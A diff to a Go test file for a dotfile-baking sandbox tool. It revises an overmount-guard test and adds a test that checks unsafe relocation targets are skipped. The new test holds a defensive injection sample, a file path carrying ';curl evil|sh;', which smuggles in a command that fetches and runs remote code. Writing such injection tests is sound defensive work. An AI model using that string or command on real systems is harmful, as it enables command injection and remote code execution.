@@ -584,14 +584,42 @@ func TestOvermountGuardRejectsBakedPathUnderHome(t *testing.T) {
 }
 
 func TestResolveDotfilesRejectsOvermountTarget(t *testing.T) {
-	// Not reachable from the real mapping, but the resolver refuses it anyway.
-	_, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: OvermountHome + "/x"}}, OvermountHome)
-	// The generic mapping relocates to XDG, so this specific input is fine;
-	// assert the guard path by constructing a target directly instead.
-	require.NoError(t, err)
+	// The real mapping never produces a target under /sandbox, so exercise the
+	// guard by giving an overmount prefix that overlaps a real relocation
+	// target: .gitconfig relocates to /etc/gitconfig, which is under "/etc".
+	_, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.gitconfig"}}, "/etc")
+	require.Error(t, err, "a target under the overmount prefix is refused")
+	assert.Contains(t, err.Error(), "/etc", "the error names the overmount prefix")
+	// Boundary behavior of the helper the guard uses.
 	assert.True(t, UnderOvermount(OvermountHome, OvermountHome+"/.config"))
 	assert.False(t, UnderOvermount(OvermountHome, XDGConfigHome+"/x"))
 	assert.False(t, UnderOvermount("", OvermountHome+"/x"), "no overmount prefix means never under it")
+}
+
+// TestResolveDotfilesSkipsUnsafeTarget checks that a dotfile whose relocation
+// target would carry shell metacharacters is skipped with a notice rather than
+// baked, so it can never inject into the generated COPY/RUN instructions
+// (spec 003 US3, constitution IV).
+func TestResolveDotfilesSkipsUnsafeTarget(t *testing.T) {
+	inputs := []DotfileInput{
+		{HostPath: "~/.config/x;curl evil|sh;", Content: "x\n"},
+		{HostPath: "~/.gitconfig", Content: "[user]\n", FromAllowlist: true},
+	}
+	sels, _, extra, err := resolveDotfiles(inputs, OvermountHome)
+	require.NoError(t, err)
+	// Only the safe .gitconfig is baked.
+	require.Len(t, sels, 1)
+	assert.Equal(t, GitConfigPath, sels[0].RelocatedTo)
+	for _, s := range sels {
+		assert.True(t, safeTargetRe.MatchString(s.RelocatedTo), "every baked target is a safe path")
+	}
+	var skipped bool
+	for _, n := range extra {
+		if strings.Contains(n, "unsafe image path") {
+			skipped = true
+		}
+	}
+	assert.True(t, skipped, "the unsafe dotfile is reported as skipped: %v", extra)
 }
 
 func TestReprovisionOnlyForOvermountTarget(t *testing.T) {
